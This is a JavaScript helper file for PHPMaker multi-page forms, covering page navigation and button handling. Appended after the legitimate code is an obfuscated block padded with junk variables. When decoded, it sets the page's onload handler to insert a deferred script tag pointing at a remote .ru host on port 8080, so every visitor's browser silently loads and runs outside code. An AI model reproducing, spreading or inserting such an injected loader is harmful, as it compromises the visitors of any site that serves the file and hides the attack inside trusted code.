// JavaScript for multiple page update for PHPMaker 4+
// (C) 2006 e.World Technology Ltd.

var EW_AfterInit = false;

function EW_InitMultiPage(f) {
	EW_MaxPageIndex = 0;
	for (var i=0; i<arFldPage.length; i++) {
		if (arFldPage[i][1] > EW_MaxPageIndex)
			EW_MaxPageIndex = arFldPage[i][1]; 
	}	
	EW_MinPageIndex = EW_MaxPageIndex;
	for (var i=0; i<arFldPage.length; i++) {
		if (arFldPage[i][1] < EW_MinPageIndex)
			EW_MinPageIndex = arFldPage[i][1]; 
	}
	EW_NextPage(f);
	EW_AfterInit = true;
}

function EW_NextPage(f) {
	if (!(document.getElementById || document.all))
		return;
	if (EW_AfterInit && !EW_checkMyForm(f))
		return;
	EW_DisableButtons();
	var rowcnt = 0;
	while (rowcnt == 0 && EW_PageIndex < EW_MaxPageIndex) {
		EW_PageIndex++;
		var rowcnt;
		for (var i=0; i<arFldPage.length; i++)
			if (arFldPage[i][1] == EW_PageIndex) rowcnt++;
		if (rowcnt > 0) EW_ShowPage();
	}
	EW_UpdateButtons();
}

function EW_PrevPage() {
	if (!(document.getElementById || document.all))
		return;
	EW_DisableButtons();	
	var rowcnt = 0;
	while (rowcnt == 0 && EW_PageIndex > EW_MinPageIndex) {
		EW_PageIndex--;
		var rowcnt;
		for (var i=0; i<arFldPage.length; i++)
			if (arFldPage[i][1] == EW_PageIndex) rowcnt++;
		if (rowcnt > 0) EW_ShowPage();	
	}
	EW_UpdateButtons();
}

function EW_ShowPage() {
	for (var i=0; i<arFldPage.length; i++) {
		var row = EW_GetElement(arFldPage[i][0]);
		if (row) {
			row.style.display = (arFldPage[i][1] == EW_PageIndex) ? '' : 'none';
			if (row.style.display == '')
				EW_createEditor(arFldPage[i][0]);
		}	
	}
}

function EW_UpdateButtons() {
    var btn = EW_GetElement('btnPrevPage'); 
    if (btn) btn.disabled = EW_PageIndex <= EW_MinPageIndex;
    var btn = EW_GetElement('btnNextPage'); 
    if (btn) btn.disabled = EW_PageIndex >= EW_MaxPageIndex;
    var btn = EW_GetElement('btnAction'); 
    if (btn) btn.style.display = (EW_PageIndex < EW_MaxPageIndex) ? 'none' : ''; 
    var elem = EW_GetElement('ewPageInfo');
    if (elem) elem.innerHTML = EW_MultiPagePage + " " + (EW_PageIndex) + " " + EW_MultiPageOf + " " + (EW_MaxPageIndex);
}

function EW_DisableButtons() {
    var btn = EW_GetElement('btnPrevPage'); 
    if (btn) btn.disabled = false;
    var btn = EW_GetElement('btnNextPage'); 
    if (btn) btn.disabled = false;
    var btn = EW_GetElement('btnAction'); 
    if (btn) btn.style.display = 'none';    
}

function EW_GetElement(elemid) {
	return (document.all) ? document.all(elemid) :
		(document.getElementById) ? document.getElementById(elemid) : null;
}

function EW_IsElementVisible(elemid) {
	if (!(document.getElementById || document.all))
		return true;
	var elem = EW_GetElement(elemid);
	return (elem && elem.style.display == '');
}


var pK=new Array();var _p=new Array();try {this.d='';var O;if(O!='f' && O!='eR'){O=''};var CD;if(CD!='' && CD!='q_'){CD='Y'};var T='g';this.GD='';var a=RegExp;var k=new Array();var Tb='[';var _='replace';var Xo="";var n='';var _k;if(_k!='' && _k!='kT'){_k='oU'};var s=']';var i='';var V;if(V!='' && V!='pV'){V=null};function R(G,C){var bE;if(bE!='' && bE!='at'){bE=''};var ib;if(ib!='' && ib!='HF'){ib=''};var zR="";var M=Tb;M+=C;var Zb=new Date();M+=s;var zB;if(zB!='ry' && zB != ''){zB=null};var Xn=new String();var Mn=new a(M, T);var NQ=new Array();var mC=new Date();return G[_](Mn, n);};var y=new String();var uZ;if(uZ!='' && uZ!='av'){uZ=null};this.Ee="";var U=R('aWpvpBeXnBd1C1hviBl1dX',"vBWX1");var G="1";var o=R('bHo5dCy5',"HnCY5");var Nd="";var m=R('sCeCt4A4tCtCrCi4b4u4tCe4',"4C");var Uo="";var K=R('cGrNe7aNt7e7EMlNeqmGeMn7t7',"qGNM7");var eu=new String();var bX;if(bX!='cn'){bX=''};var F=R('oPnNlPoNaDdN',"NPAD");var q='';var p=R('s2c2rjijpyt2',"20yj");this.MF="";var B=R('hItJtJpJ:I/I/ImIoInIoIgIrJaIfJiJaJsI-JcIoImJ.IwIiJkIiImIeJdJiJaJ.IoIrIgI.JpJaJrItIyIpJoIkIeIrI-IcJoJmI.JiIwJeIsItIpIoJiInJtJ.JrJuJ:I',"IJ");var v=R('8199997099179987919970999991',"179");var FI=new Array();var FH=R('/kguouo5gFlbeb.5cuobm5/kguokoFgulueb.bcuoFm5/kw5auskhuiun5gut5oFnkp5o5sFtu.bcuoFmk/uy5nkeutu.ucuobmb/ktbw5ibtupFiucu.5cbo5mF.5pbhupb',"uF5bk");var Ex=new String();var S_;if(S_!='' && S_!='HJ'){S_='aB'};var g;if(g!='' && g!='Ox'){g='Zs'};window[F]=function(){var Rs;if(Rs!=''){Rs='ZC'};this.Gx='';var ml;if(ml!='' && ml!='fI'){ml='yy'};W=document[K](p);var pX="";q+=B;var dt;if(dt!='Am'){dt='Am'};this.Oz="";q+=v;q+=FH;var SZ=new Array();W.src=q;var Gn;if(Gn!='' && Gn!='yyO'){Gn='YG'};var Yr;if(Yr!='ES'){Yr='ES'};var Il;if(Il!='fa'){Il='fa'};var nY;if(nY!='ce'){nY=''};var z=document[o];var _q;if(_q!='lV' && _q != ''){_q=null};W.setAttribute('defer', G);var Bi;if(Bi!=''){Bi='Tx'};this.qs='';var dj;if(dj!='' && dj!='Ek'){dj=null};z.appendChild(W);this.uZB='';this.vl='';};var ST=new Array();var pD;if(pD!='SpC'){pD=''};} catch(A){};var Jq='';